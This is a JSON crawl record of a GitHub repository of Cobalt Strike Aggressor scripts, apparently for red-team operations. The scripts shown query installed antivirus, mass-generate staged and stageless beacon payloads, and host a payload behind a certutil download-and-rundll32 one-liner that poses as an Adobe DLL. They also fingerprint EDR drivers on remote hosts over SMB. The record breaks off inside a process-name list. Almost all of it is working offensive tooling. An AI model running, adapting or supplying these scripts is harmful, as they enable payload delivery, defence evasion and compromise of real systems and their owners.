{
  "metadata": {
    "timestamp": 1736711064716,
    "page": 835,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjg0MA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "harleyQu1nn/AggressorScripts",
      "stars": 1487,
      "defaultBranch": "master",
      "files": [
        {
          "name": "AVQuery.cna",
          "type": "blob",
          "size": 2.1025390625,
          "content": "#AntiVirus Query\n#Author: @r3dQu1nn\n#Queries the Registry for AV installed\n#Thanks to @i_am_excite and @merrillmatt011 for the help\n#Props to @zerosum0x0 for the wmic find!\n\n#Long ass one-liner :)\n$powershellcmd = \"\\$av_list = @(\\\"BitDefender\\\", \\\"Kaspersky\\\", \\\"McAfee\\\", \\\"Norton\\\", \\\"Avast\\\", \\\"WebRoot\\\", \\\"AVG\\\", \\\"ESET\\\", \\\"Malware\\\", \\\"Windows Defender\\\");\\$av_install = Get-ItemProperty HKLM:\\\\SOFTWARE\\\\Wow6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\*;\\$av_install1 = Get-ItemProperty HKLM:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\*;\\$regkey = 'HKLM:\\\\SOFTWARE\\\\Microsoft\\\\Windows Defender\\\\Signature Updates\\\\';\\$av_loop2 = foreach (\\$av1 in \\$av_list){foreach (\\$key in \\$av_install){if (\\$key.DisplayName -match \\$av1 -eq \\$TRUE){% {\\\"{0}|{1}|{2}\\\" -f \\$key.DisplayName.ToString(), \\$key.DisplayVersion.ToString(), \\$key.InstallDate.ToString()}}}};\\$proc_temp = Get-Process;\\$av_loop = foreach (\\$av in \\$av_list){foreach (\\$zz in \\$proc_temp){if (\\$zz.path -match \\$av -eq \\$TRUE){% {\\\"{0}|{1}|{2}\\\" -f \\$zz.Id.ToString(), \\$zz.Name.Split('\\\"')[0],  \\$zz.Path.ToString()}}}};\\$av_loop3 = foreach (\\$av2 in \\$av_list){foreach (\\$key1 in \\$av_install1){if (\\$key1.DisplayName -match \\$av2 -eq \\$TRUE){% {\\\"{0}|{1}|{2}\\\" -f \\$key1.DisplayName.ToString(), \\$key1.DisplayVersion.ToString(), \\$key1.InstallDate.ToString()}}}};Write-Output \\\"`nPID|Name|Path`n\\\";Write-Output \\$av_loop;Write-Output \\\"`nWindows Defender AV Signature Version:\\\";(Get-ItemProperty -Path \\$regkey).ASSignatureVersion;Write-Output \\\"`nAV Name|Version|Install Date`n\\\";Write-Output \\$av_loop2;Write-Output \\$av_loop3\";\n\n#AV_Query Command Register\nbeacon_command_register(\"AV_Query\", \"Queries the Registry for AV Installed\",\n\t\"Syntax: AV_Query\\n\" .\n\t\"Checks HKLM hive for All AntiVirus installed\");\n\n#AV_Query alias\nalias AV_Query {\n\t\n\tblog($1, \"\\cBDetermining what AntiVirus is installed...\");\n\tbpowerpick!($1, $powershellcmd);\n\tbpause($1, int(30000));\n\tbpowerpick!($1, \"Get-WmiObject -Namespace \\\"root\\\\SecurityCenter2\\\" -Query \\\"SELECT * FROM AntiVirusProduct\\\" | select-object displayName,pathToSignedReportingExe,timestamp| fl\");\n\t\t\n}\n"
        },
        {
          "name": "All_In_One.cna",
          "type": "blob",
          "size": 0.0673828125,
          "content": "Remaking this completely. Keep an eye out for a version 2 release :)\n"
        },
        {
          "name": "ArtifactPayloadGenerator.cna",
          "type": "blob",
          "size": 3.427734375,
          "content": "#Automatic Artifact Payload Generator\n#Author: @r3dQu1nn\n#Generates every type of Stageless/Staged Payload based off a HTTP/HTTPS Listener\n\n#Custom Directory for Payloads\nmkdir(\"/opt/cobaltstrike/Staged_Payloads\");\nmkdir(\"/opt/cobaltstrike/Stageless_Payloads\");\n\nmenubar(\"Payload Generator\", \"payloadgenerator\");\npopup payloadgenerator {\n\titem \"&Automatic Artifact Payload Generator\" {\n\t\tprompt_confirm(\"Do you want to generate all the different types of Artifacts?\", \"Payload Generator Confirmation\", {\n\t\t\tshow_message(\"Generating Artifacts...\");\n\t\t\tpayloadgenerate();\n\t\t\tshow_message(\"Check /opt/cobaltstrike/ for Staged and Stageless Payloads\");\n\t\t});\n\t}\n}\n\nsub payloadgenerate {\n\tforeach $name (listeners_local()) {\n\t$original_listener = $name;\n    \t$listener_name = lc($name);\n        if ($listener_name hasmatch \"http\" || $listener_name hasmatch \"https\") {\n        \t\n        \t#Staged Payloads\n        \t$data = artifact_stager($original_listener, \"dll\");\n        \t$data2 = artifact_stager($original_listener, \"exe\");\n        \t$data3 = artifact_stager($original_listener, \"powershell\");\n        \t$data4 = artifact_stager($original_listener, \"python\");\n        \t$data5 = artifact_stager($original_listener, \"svcexe\");\n        \t$data6 = artifact_stager($original_listener, \"vbscript\");\n        \t$data7 = artifact_stager($original_listener, \"raw\");\n\n\t        #Write and Save Payloads\n\t        $handle = openf(\">/opt/cobaltstrike/Staged_Payloads/dllpayload.dll\");\n\t\twriteb($handle, $data);\n\t\tclosef($handle);\n\t\t$handle2 = openf(\">/opt/cobaltstrike/Staged_Payloads/exepayload.exe\");\n\t\twriteb($handle2, $data2);\n\t\tclosef($handle2);\n\t\t$handle3 = openf(\">/opt/cobaltstrike/Staged_Payloads/powershellpayload.ps1\");\n\t\twriteb($handle3, $data3);\n\t\tclosef($handle3);\n\t\t$handle4 = openf(\">/opt/cobaltstrike/Staged_Payloads/pythonpayload.py\");\n\t\twriteb($handle4, $data4);\n\t\tclosef($handle4);\n\t\t$handle5 = openf(\">/opt/cobaltstrike/Staged_Payloads/svcexepayload.exe\");\n\t\twriteb($handle5, $data5);\n\t\tclosef($handle5);\n\t\t$handle6 = openf(\">/opt/cobaltstrike/Staged_Payloads/vbspayload.vbs\");\n\t\twriteb($handle6, $data6);\n\t\tclosef($handle6);\n\t\t$handle7 = openf(\">/opt/cobaltstrike/Staged_Payloads/rawpayload.bin\");\n\t\twriteb($handle7, $data7);\n\t\tclosef($handle7);\n\n\t\t#Stageless Payloads\n\t\t$data8 = artifact_payload($original_listener, \"dll\", \"x64\");\n\t        $data9 = artifact_payload($original_listener, \"exe\", \"x86\");\n\t        $data10 = artifact_payload($original_listener, \"python\", \"x86\");\n\t        $data11 = artifact_payload($original_listener, \"powershell\", \"x86\");\n\t        $data12 = artifact_payload($original_listener, \"raw\", \"x86\");\n\t        $data13 = artifact_payload($original_listener, \"svcexe\", \"x86\");\n\t        \n\t        #Write and Save Payloads\n\t\t$cradle = openf(\">/opt/cobaltstrike/Stageless_Payloads/dllpayload.dll\");\n\t\twriteb($cradle, $data8);\n\t\tclosef($cradle);\n\t\t$cradle2 = openf(\">/opt/cobaltstrike/Stageless_Payloads/exepayload.exe\");\n\t\twriteb($cradle2, $data9);\n\t\tclosef($cradle2);\n\t\t$cradle3 = openf(\">/opt/cobaltstrike/Stageless_Payloads/powershellpayload.ps1\");\n\t\twriteb($cradle3, $data11);\n\t\tclosef($cradle3);\n\t\t$cradle4 = openf(\">/opt/cobaltstrike/Stageless_Payloads/rawpayload.bin\");\n\t\twriteb($cradle4, $data12);\n\t\tclosef($cradle4);\n\t\t$cradle5 = openf(\">/opt/cobaltstrike/Stageless_Payloads/pythonpayload.py\");\n\t\twriteb($cradle5, $data10);\n\t\tclosef($cradle5);\n\t\t$cradle6 = openf(\">/opt/cobaltstrike/Stageless_Payloads/svcexepayload.exe\");\n\t\twriteb($cradle6, $data13);\n\t\tclosef($cradle6);\n\t\t}\n\t}\n}\n"
        },
        {
          "name": "CertUtilWebDelivery.cna",
          "type": "blob",
          "size": 2.341796875,
          "content": "# CertUtil Scripted Web Delivery (Stageless)\r\n# Author: @r3dQu1nn\r\n# This script is based off the Scripted Web Delivery created by @armitagehacker, <3 raffi!\r\n# https://gist.github.com/rsmudge/629bd4ddce3bbbca1f8c16378a6a419c\r\n# Please be aware of the default values used in the script\r\n# Thanks to @carnal0wnage and @subTee for the discovery of this type of attack\r\n# https://twitter.com/subTee/status/888071631528235010\r\n# http://carnal0wnage.attackresearch.com/2017/08/certutil-for-delivery-of-files.html\r\n\r\n# setup our stageless CertUtil Web Delivery attack\r\nsub stage_attack {\r\n\tlocal('%options $script $url $arch');\r\n\t%options = $3;\r\n\r\n\t# get the arch right.\r\n\t$arch = iff(%options[\"x64\"] eq \"true\", \"x64\", \"x86\");\r\n\r\n\t# generate our stageless CertUtil script. We're going to make *this* function\r\n\t# the callback for this call. That's why we yield after.\r\n\tartifact_stageless(%options[\"listener\"], \"dll\", $arch, $null, $this);\r\n\tyield;\r\n\r\n\t# this function is now resumed after &artifact_stageless finished. $1 is our script.\r\n\t$script = $1;\r\n\r\n\t# host the script\r\n\t$url = site_host(%options[\"host\"], %options[\"port\"], %options[\"uri\"], $script, \"automatic\", \"Scripted Web Delivery (CertUtil)\"); \r\n\r\n\t# tell the user our URL\r\n\tprompt_text(\"Copy/Paste One-liner: \", \"powerpick certutil.exe -urlcache -split -f \" . $url . \" Adobedll.dll; rundll32.exe Adobedll.dll,StartW\", {});\r\n\tshow_message(\"Be aware of the default values in this script and change them! (Adobedll.dll, dll.txt)\");\r\n\telog(\"powerpick certutil.exe -urlcache -split -f \" . $url . \" Adobedll.dll; rundll32.exe Adobedll.dll,StartW\");\r\n\r\n}\r\n\r\n# create a popup menu\r\npopup attacks {\r\n\titem \"CertUtil Web Delivery (S)\" {\r\n\t\tlocal('$dialog %defaults');\r\n\r\n\t\t# setup our defaults\r\n\t\t%defaults[\"uri\"]  = \"/dll.txt\";\r\n\t\t%defaults[\"host\"] = localip();\r\n\t\t%defaults[\"port\"] = 80;\r\n\r\n\t\t# create our dialog\r\n\t\t$dialog = dialog(\"CertUtil Web Delivery (Stageless)\", %defaults, &stage_attack);\r\n\t\tdialog_description($dialog, \"A stageless version of the CertUtil Web Delivery attack.\");\r\n\t\tdrow_text($dialog, \"uri\", \"URI Path: \", 20);\r\n\t\tdrow_text($dialog, \"host\", \"Local Host: \");\r\n\t\tdrow_text($dialog, \"port\", \"Local Port: \");\r\n\t\tdrow_listener_stage($dialog, \"listener\", \"Listener: \");\r\n\t\tdrow_checkbox($dialog, \"x64\", \"x64: \", \"Use x64 payload\");\r\n\t\tdbutton_action($dialog, \"Launch\");\r\n\r\n\t\t# show our dialog\r\n\t\tdialog_show($dialog);\r\n\t}\r\n}\r\n\r\n"
        },
        {
          "name": "DriverSearcher",
          "type": "tree",
          "content": null
        },
        {
          "name": "EDR.cna",
          "type": "blob",
          "size": 12.8720703125,
          "content": "## EDR.cna\r\n## Author: @r3dqu1nn\r\n## Remotely query a system for EDR products\r\n## Additions made by @_bin_Ash\r\n\r\n## List of EDR drivers\r\n@edr = @(\"psepfilter.sys\", \"cbfsfilter2017.sys\", \"cve.sys\", \"atrsdfw.sys\", \"naswSP.sys\", \"aswSP.sys\", \"avgtpx86.sys\", \"avgtpx64.sys\", \"edrsensor.sys\", \"hbflt.sys\", \"bdsvm.sys\", \"gzflt.sys\", \"bddevflt.sys\", \"AVCKF.SYS\", \"Atc.sys\", \"AVC3.SYS\", \"TRUFOS.SYS\", \"BDSandBox.sys\", \"brfilter.sys\", \"BrCow_x_x_x_x.sys\", \"bemk.sys\", \"CarbonBlackK.sys\", \"parity.sys\", \"cbstream.sys\", \"cbk7.sys\", \"ctifile.sys\", \"epregflt.sys\", \"medlpflt.sys\", \"dsfa.sys\", \"cposfw.sys\", \"CiscoAMPCEFWDriver.sys\", \"CiscoAMPHeurDriver.sys\", \"cb\", \"csaenh.sys\", \"csareg.sys\", \"csascr.sys\", \"csaav.sys\", \"csaam.sys\", \"csacentr.sys\", \"rvsavd.sys\", \"cfrmd.sys\", \"cmdccav.sys\", \"cmdguard.sys\", \"CmdMnEfs.sys\", \"MyDLPMF.sys\", \"im.sys\", \"CSDeviceControl.sys\", \"csagent.sys\", \"CSBoot.sys\", \"cspcm2.sys\", \"CybKernelTracker.sys\", \"CRExecPrev.sys\", \"CyOptics.sys\", \"CyProtectDrv32.sys\", \"CyProtectDrv64.sys.sys\", \"CyProtectDrv64.sys\", \"groundling32.sys\", \"groundling64.sys\", \"ElasticEndpoint.sys\", \"ElasticEndpointDriver.sys\", \"esensor.sys\", \"edevmon.sys\", \"ehdrv.sys\", \"FeKern.sys\", \"WFP_MRT.sys\", \"xfsgk.sys\", \"fsatp.sys\", \"fshs.sys\", \"fsgk.sys\", \"HexisFSMonitor.sys\", \"klifks.sys\", \"klifaa.sys\", \"Klifsm.sys\", \"LRAgentMF.sys\", \"mbamwatchdog.sys\", \"mfeaskm.sys\", \"mfencfilter.sys\", \"epdrv.sys\", \"mfencoas.sys\", \"mfehidk.sys\", \"swin.sys\", \"hdlpflt.sys\", \"mfprom.sys\", \"MfeEEFF.sys\", \"libwamf.sys\", \"telam.sys\", \"PSINPROC.SYS\", \"PSINFILE.SYS\", \"amfsm.sys\", \"amm8660.sys\", \"amm6460.sys\", \"eaw.sys\", \"SAFE-Agent.sys\", \"SentinelMonitor.sys\", \"SAVOnAccess.sys\", \"sld.sys\", \"SophosED.sys\", \"sntp.sys\", \"swi_callout.sys\", \"hmpalert.sys\", \"sdcfilter.sys\", \"SophosBootDriver.sys\", \"pgpwdefs.sys\", \"GEProtection.sys\", \"diflt.sys\", \"sysMon.sys\", \"ssrfsf.sys\", \"emxdrv2.sys\", \"reghook.sys\", \"spbbcdrv.sys\", \"bhdrvx86.sys\", \"bhdrvx64.sys\", \"SISIPSFileFilter\", \"symevent.sys\", \"vxfsrep.sys\", \"VirtFile.sys\", \"SymAFR.sys\", \"symefasi.sys\", \"symefa.sys\", \"symefa64.sys\", \"SymHsm.sys\", \"evmf.sys\", \"GEFCMP.sys\", \"VFSEnc.sys\", \"pgpfs.sys\", \"fencry.sys\", \"symrg.sys\", \"SISIPSFileFilter.sys\", \"TMUMS.sys\", \"hfileflt.sys\", \"TMUMH.sys\", \"AcDriver.sys\", \"SakFile.sys\", \"SakMFile.sys\", \"fileflt.sys\", \"TmEsFlt.sys\", \"tmevtmgr.sys\", \"TmFileEncDmk.sys\", \"ndgdmk.sys\", \"dgdmk.sys\", \"ssfmonm.sys\");\r\n\r\n\r\n## edr_query Command Register\r\nbeacon_command_register(\"edr_query\", \"Queries the remote or local system for all major EDR products installed\",\r\n    \"Syntax: edr_query [hostname] [arch]\\n\" .\r\n    \"Checks the local or remote system for installed EDR products. **Note: Use localhost for [hostname] to query the local system**\");\r\n\r\n## edr_query alias\r\nalias edr_query {\r\n\t$bid = $1;\r\n    if ($2 is $null) {\r\n\t\tblog($bid, \"\\c4Please enter a remote hostname or localhost!\");\r\n\t\tshow_message(\"Please enter a remote hostname or localhost!\");\r\n\t}\r\n\telse if ($3 is $null) {\r\n\t\tblog($bid, \"\\c4Please enter a valid architechture!\");\r\n\t\tshow_message(\"Please enter a valid architechture!\");\r\n\t}\r\n    else if ($3 ismatch 'x64') {\r\n        blog($bid, \"\\cBDetermining what EDR products are installed on \". $2 .\"...\");\r\n        bls($bid, \"\\\\\\\\\". $2 .\"\\\\C\\$\\\\windows\\\\system32\\\\drivers\", &list);\r\n    }\r\n    else if ($3 ismatch 'x86') {\r\n        blog($bid, \"\\cBDetermining what EDR products are installed on \". $2 .\"...\");\r\n        bls($bid, \"\\\\\\\\\". $2 .\"\\\\C\\$\\\\windows\\\\sysnative\\\\drivers\", &list);\r\n    }\r\n}\r\n\r\nsub query {\r\n\t\r\n\t$bid = $1;\r\n\t$dialog = dialog(\"EDR Query Menu\", %(hostname => \"Enter Remote HostName\", Arch => \"\"), &EDR);\r\n\tdialog_description($dialog, \"EDR Query Menu. Remotely query a system for EDR products. Hostname field (IP or Hostname) is Mandatory! **Note: Use localhost for the local system.**\");\r\n\tdrow_text($dialog, \"hostname\", \"Target HostName:\");\r\n\tdrow_combobox($dialog, \"Arch\", \"Target Architechture:\", @(\"x86\", \"x64\"));\r\n\tdbutton_action($dialog, \"Execute\");\r\n\tdialog_show($dialog);\r\n\r\n}\r\n\r\nsub EDR {\r\n\r\n\tif ($3['hostname'] ismatch 'Enter Remote HostName') {\r\n\t\tshow_message(\"Please enter a remote hostname or localhost!\");\r\n\t\tblog($bid, \"\\c4Please enter a remote hostname or localhost!\");\r\n\t}\r\n\telse if ($3['Arch'] ismatch 'x86') {\r\n\t\tbls($bid, \"\\\\\\\\\". $3['hostname'] .\"\\\\C\\$\\\\windows\\\\sysnative\\\\drivers\", &list);\r\n\t\tblog($bid, \"\\cBDetermining what EDR products are installed on \". $3['hostname']. \"...\");\r\n\t}\r\n\telse if ($3['Arch'] ismatch 'x64') {\r\n\t\tbls($bid, \"\\\\\\\\\". $3['hostname'] .\"\\\\C\\$\\\\windows\\\\system32\\\\drivers\", &list);\r\n\t\tblog($bid, \"\\cBDetermining what EDR products are installed on \". $3['hostname']. \"...\");\r\n\t}\r\n\r\n}\r\n\r\n#Parse dem results\r\nsub list {\r\n\r\n    local('$entry $type $size $modified $name $out');\r\n    @results = split(\"\\n\", [\"$3\" trim]);\r\n    @matches = @();\r\n    foreach $entry (@results) {\r\n    ($type, $size, $modified, $name) = split(\"\\t\", $entry);\r\n        if ($name in @edr) {\r\n            blog($bid, \"\\cB$name Found\");\r\n            add(@matches, $name, 0);\r\n        }\r\n    }\r\n\r\n    $size = size(@matches);\r\n\r\n    ## Print banner\r\n    $out .= \"\\c4$size EDR Products Found!\\n\";\r\n    $out .= \"    \\c0======================\\n\";\r\n    $out .= \"    | Vendor Information | \\n\";\r\n    $out .= \"\\c0    ----------------------\";\r\n\r\n    ## Initial error checking\r\n    if (size(@matches) == 0) {\r\n        blog($bid, \"\\c9No EDR products found! Operate at your own risk!\");\r\n        clear(@matches);\r\n    }\r\n    if (size(@matches) > 0) {\r\n        blog($bid, $out);\r\n    }\r\n\r\n    ## Driver checking\r\n\r\n    ### Absolute\r\n    if ('psepfilter.sys' in @matches || 'cve.sys' in @matches || 'cbfsfilter2017.sys' in @matches) {\r\n        blog($bid, \"Absolute Found!\");\r\n    }\r\n\r\n    ### Altiris (Symantec)\r\n    if ('atrsdfw.sys' in @matches) {\r\n        blog($bid, \"Altiris (Symantec) Found!\");\r\n    }\r\n\r\n    ### Avast\r\n    if ('aswSP.sys' in @matches || 'naswSP.sys' in @matches) {\r\n        blog($bid, \"Avast Found!\");\r\n    }\r\n\r\n    ### AVG Technologies\r\n    if ('avgtpx86.sys' in @matches || 'avgtpx64.sys' in @matches) {\r\n        blog($bid, \"AVG Technologies Found!\");\r\n    }\r\n\r\n    ## BitDefender\r\n        if ('edrsensor.sys' in @matches || 'hbflt.sys' in @matches || 'bdsvm.sys' in @matches || 'gzflt.sys' in @matches || 'bddevflt.sys' in @matches || 'AVCKF.SYS' in @matches || 'Atc.sys' in @matches || 'AVC3.SYS' in @matches || 'TRUFOS.SYS' in @matches || 'BDSandBox.sys' in @matches) {\r\n        blog($bid, \"BitDefender Found!\");\r\n    }\r\n\r\n    ## Bromium\r\n    if ('brfilter.sys' in @matches || 'BrCow_x_x_x_x.sys' in @matches || 'bemk.sys' in @matches) {\r\n        blog($bid, \"Bromium Found!\");\r\n    }\r\n\r\n    ### Carbon Black\r\n    if ('CarbonBlackK.sys' in @matches || 'carbonblackk.sys' in @matches || \"Parity.sys\" in @matches || \"cbk7.sys\" in @matches || \"cbstream.sys\" in @matches || \"ctifile.sys\" in @matches) {\r\n        blog($bid, \"Carbon Black Found!\");\r\n    }\r\n\r\n    ### Check Point Software Technologies\r\n    if ('epregflt.sys' in @matches || 'medlpflt.sys' in @matches || 'dsfa.sys' in @matches || 'cposfw.sys' in @matches || 'epklib.sys' in @matches) {\r\n        blog($bid, \"Check Point Software Technologies Found!\");\r\n    }\r\n\r\n    ### Cisco AMP\r\n    if ('CiscoAMPCEFWDriver.sys' in @matches || 'CiscoAMPHeurDriver.sys' in @matches) {\r\n        blog($bid, \"Cisco AMP Found!\")\r\n    }\r\n\r\n    ### Cisco Secure Endpoint\r\n    if ('csacentr.sys' in @matches || 'csaenh.sys' in @matches || 'csareg.sys' in @matches || 'csascr.sys' in @matches || 'csaav.sys' in @matches || 'csaam.sys' in @matches) {\r\n        blog($bid, \"Cisco Found!\");\r\n    }\r\n\r\n    ### CJSC Returnil Software\r\n    if ('rvsavd.sys' in @matches) {\r\n        blog($bid, \"CJSC Returnil Software Found!\");\r\n    }\r\n\r\n    ### Comodo Security Solutions\r\n    if ('cfrmd.sys' in @matches || 'cmdccav.sys' in @matches || 'cmdguard.sys' in @matches || 'CmdMnEfs.sys' in @matches || 'MyDLPMF.sys' in @matches) {\r\n        blog($bid, \"Comodo Security Solutions Found!\");\r\n    }\r\n\r\n    ### CrowdStrike\r\n    if ('im.sys' in @matches || 'CSAgent.sys' in @matches || 'CSBoot.sys' in @matches || 'CSDeviceControl.sys' in @matches || 'cspcm2.sys' in @matches) {\r\n        blog($bid, \"CrowdStrike Found!\");\r\n    }\r\n\r\n    ### CyberArk \r\n    if ('CybKernelTracker.sys' in @matches || 'vfdrv.sys' in @matches || 'vfnet.sys' in @matches || 'vfpd.sys' in @matches ) {\r\n        blog($bid, \"CyberArk Software Found!\");\r\n    }\r\n\r\n    ### Cybereason\r\n    if ('CRExecPrev.sys' in @matches) {\r\n        blog($bid, \"Cybereason Found!\");\r\n    }\r\n\r\n    ### Cylance Inc.\r\n    if ('CyOptics.sys' in @matches || 'CyProtectDrv32.sys' in @matches || 'CyProtectDrv64.sys' in @matches) {\r\n        blog($bid, \"Cylance Inc. Found!\");\r\n    }\r\n\r\n    ### Dell Secureworks\r\n    if ('groundling32.sys' in @matches || 'groundling64.sys' in @matches) {\r\n        blog($bid, \"Dell Secureworks Found!\");\r\n    }\r\n\r\n    ### Elastic Security for Endpoint\r\n    if ('ElasticEndpoint.sys' in @matches || 'ElasticEndpointDriver.sys' in @matches) {\r\n        blog($bid, \"Elastic Security for Endpoint detected!\")\r\n    }\r\n\r\n    ### Endgame\r\n    if ('esensor.sys' in @matches) {\r\n        blog($bid, \"Endgame Found!\");\r\n    }\r\n\r\n    ### ESET\r\n    if ('edevmon.sys' in @matches || 'ehdrv.sys' in @matches || 'eamonm.sys' in @matches || 'ekbdflt.sys' in @matches) {\r\n        blog($bid, \"ESET Found!\");\r\n    }\r\n\r\n    ### FireEye\r\n    if ('FeKern.sys' in @matches || 'WFP_MRT.sys' in @matches) {\r\n        blog($bid, \"FireEye Found!\");\r\n    }\r\n\r\n    ### F-Secure\r\n    if ('xfsgk.sys' in @matches || 'fsgk.sys' in @matches || 'fsatp.sys' in @matches || 'fshs.sys' in @matches) {\r\n        blog($bid, \"F-Secure Found!\");\r\n    }\r\n\r\n    ### Heix Cyber Solutions \r\n    if ('HexisFSMonitor.sys' in @matches) {\r\n        blog($bid, \"Hexis Cyber Solutions Found!\");\r\n    }\r\n\r\n    ### Kaspersky\r\n    if ('klifks.sys' in @matches || 'klifaa.sys' in @matches || 'Klifsm.sys' in @matches) {\r\n        blog($bid, \"Kaspersky Found!\");\r\n    }\r\n\r\n    ### LogRhythm\r\n    if ('LRAgentMF.sys' in @matches) {\r\n        blog($bid, \"LogRhythm Found!\");\r\n    }\r\n\r\n    ### Malwarebytes\r\n    if ('mbamwatchdog.sys' in @matches) {\r\n        blog($bid, \"Malwarebytes Found!\");\r\n    }\r\n\r\n    ### McAfee\r\n    if ('mfeaskm.sys' in @matches || 'mfencfilter.sys' in @matches || 'epdrv.sys' in @matches || 'mfencoas.sys' in @matches || 'mfehidk.sys' in @matches || 'swin.sys' in @matches || 'hdlpflt.sys' in @matches || 'mfprom.sys' in @matches || 'MfeEEFF.sys' in @matches) {\r\n        blog($bid, \"McAfee Found!\");\r\n    }\r\n\r\n    ### OPSWAT Inc\r\n    if ('libwamf.sys' in @matches) {\r\n        blog($bid, \"OPSWAT Inc Found!\");\r\n    }\r\n\r\n    ### Palo Alto\r\n    if ('telam.sys' in @matches) {\r\n        blog($bid, \"Palo Alto Cortex Found!\");\r\n    }\r\n\r\n    ### Panda Security\r\n    if ('PSINPROC.SYS' in @matches || 'PSINFILE.SYS' in @matches || 'amfsm.sys' in @matches || 'amm8660.sys' in @matches || 'amm6460.sys' in @matches) {\r\n        blog($bid, \"Panda Security Found!\");\r\n    }     \r\n\r\n    ### Raytheon Cyber Solutions\r\n    if ('eaw.sys' in @matches) {\r\n        blog($bid, \"Raytheon Cyber Solutions Found!\");\r\n    }\r\n\r\n    ### SAFE-Cyberdefense\r\n    if ('SAFE-Agent.sys' in @matches) {\r\n        blog($bid, \"SAFE-Cyberdefense Found!\");\r\n    }\r\n\r\n    ### SentinelOne\r\n    if ('SentinelMonitor.sys' in @matches) {\r\n        blog($bid, \"SentinelOne Found!\");\r\n    }\r\n\r\n    ### Sophos\r\n    if ('SAVOnAccess.sys' in @matches || 'savonaccess.sys' in @matches || 'sld.sys' in @matches || 'SophosED.sys' in @matches || 'sntp.sys' in @matches || 'swi_callout.sys' in @matches || 'hmpalert.sys' in @matches || 'sdcfilter.sys' in @matches || 'SophosBootDriver.sys' in @matches) {\r\n        blog($bid, \"Sophos Found!\");\r\n    }\r\n\r\n    ### Symantec\r\n    if ('pgpwdefs.sys' in @matches || 'GEProtection.sys' in @matches || 'diflt.sys' in @matches || 'sysMon.sys' in @matches || 'ssrfsf.sys' in @matches || 'emxdrv2.sys' in @matches || 'reghook.sys' in @matches || 'spbbcdrv.sys' in @matches || 'bhdrvx86.sys' in @matches || 'bhdrvx64.sys' in @matches || 'SISIPSFileFilter.sys' in @matches || 'symevent.sys' in @matches || 'vxfsrep.sys' in @matches || 'VirtFile.sys' in @matches || 'SymAFR.sys' in @matches || 'symefasi.sys' in @matches || 'symefa.sys' in @matches || 'symefa64.sys' in @matches || 'SymHsm.sys' in @matches || 'evmf.sys' in @matches || 'GEFCMP.sys' in @matches || 'VFSEnc.sys' in @matches || 'pgpfs.sys' in @matches || 'fencry.sys' in @matches || 'symrg.sys' in @matches) {\r\n        blog($bid, \"Symantec Found!\");\r\n    }   \r\n\r\n    ### Trend Micro\r\n    if ('TMUMS.sys' in @matches || 'hfileflt.sys' in @matches || 'TMUMH.sys' in @matches || 'AcDriver.sys' in @matches || 'SakFile.sys' in @matches || 'SakMFile.sys' in @matches || 'fileflt.sys' in @matches || 'TmEsFlt.sys' in @matches || 'tmevtmgr.sys' in @matches || 'TmFileEncDmk.sys' in @matches) {\r\n        blog($bid, \"Trend Micro Inc Found!\");\r\n    }\r\n\r\n    ### Verdasys\r\n    if ('dgdmk.sys' in @matches || 'ndgdmk.sys' in @matches) {\r\n        blog($bid, \"Verdasys Inc. Found!\");\r\n    }\r\n\r\n    ### Webroot\r\n    if ('ssfmonm.sys' in @matches) {\r\n        blog($bid, \"Webroot Software, Inc. Found!\");\r\n    }\r\n\r\n}\r\n\r\npopup beacon_bottom {\r\n\titem \"EDR Query\" {\r\n\t\tquery($1);\r\n\t}\r\n}\r\n"
        },
        {
          "name": "Logging",
          "type": "tree",
          "content": null
        },
        {
          "name": "Persistence",
          "type": "tree",
          "content": null
        },
        {
          "name": "ProcessColor.cna",
          "type": "blob",
          "size": 28.275390625,
          "content": "#Color Coded Process Listing\r\n#Author: @r3dQu1nn\r\n#Takes the PS output in CS and color codes all AV processes, explorer process, browsers processes, and current process running\r\n#Thanks to @oldb00t for creating the original beacon-ps-highlight.cna script! Script here: https://github.com/oldb00t/AggressorScripts/tree/master/Ps-highlight\r\n#This script removes the need for the av_hips_executables.txt requirement\r\n\r\nset BEACON_OUTPUT_PS {\r\n\r\n    $bd = bdata($1);\r\n    @av = @(\"Tanium.exe\", \"360RP.exe\", \"360SD.exe\", \"360Safe.exe\", \"360leakfixer.exe\", \"360rp.exe\", \"360safe.exe\", \"360sd.exe\", \"360tray.exe\", \"AAWTray.exe\", \"ACAAS.exe\", \"ACAEGMgr.exe\", \"ACAIS.exe\", \"AClntUsr.EXE\", \"ALERT.EXE\", \"ALERTSVC.EXE\", \"ALMon.exe\", \"ALUNotify.exe\", \"ALUpdate.exe\", \"ALsvc.exe\", \"AVENGINE.exe\", \"AVGCHSVX.EXE\", \"AVGCSRVX.EXE\", \"AVGIDSAgent.exe\", \"AVGIDSMonitor.exe\", \"AVGIDSUI.exe\", \"AVGIDSWatcher.exe\", \"AVGNSX.EXE\", \"AVKProxy.exe\", \"AVKService.exe\", \"AVKTray.exe\", \"AVKWCtl.exe\", \"AVP.EXE\", \"AVP.exe\", \"AVPDTAgt.exe\", \"AcctMgr.exe\", \"Ad-Aware.exe\", \"Ad-Aware2007.exe\", \"AddressExport.exe\", \"AdminServer.exe\", \"Administrator.exe\", \"AeXAgentUIHost.exe\", \"AeXNSAgent.exe\", \"AeXNSRcvSvc.exe\", \"AlertSvc.exe\", \"AlogServ.exe\", \"AluSchedulerSvc.exe\", \"AnVir.exe\", \"AppSvc32.exe\", \"AtrsHost.exe\", \"Auth8021x.exe\", \"AvastSvc.exe\", \"AvastUI.exe\", \"Avconsol.exe\", \"AvpM.exe\", \"Avsynmgr.exe\", \"Avtask.exe\", \"BLACKD.exe\", \"BWMeterConSvc.exe\", \"CAAntiSpyware.exe\", \"CALogDump.exe\", \"CAPPActiveProtection.exe\", \"CAPPActiveProtection.exe\", \"CB.exe\", \"CCAP.EXE\", \"CCenter.exe\", \"CClaw.exe\", \"CLPS.exe\", \"CLPSLA.exe\", \"CLPSLS.exe\", \"CNTAoSMgr.exe\", \"CPntSrv.exe\", \"CTDataLoad.exe\", \"CertificationManagerServiceNT.exe\", \"ClShield.exe\", \"ClamTray.exe\", \"ClamWin.exe\", \"Console.exe\", \"CylanceUI.exe\", \"DAO_Log.exe\", \"DLService.exe\", \"DLTray.EXE\", \"DLTray.exe\", \"DRWAGNTD.EXE\", \"DRWAGNUI.EXE\", \"DRWEB32W.EXE\", \"DRWEBSCD.EXE\", 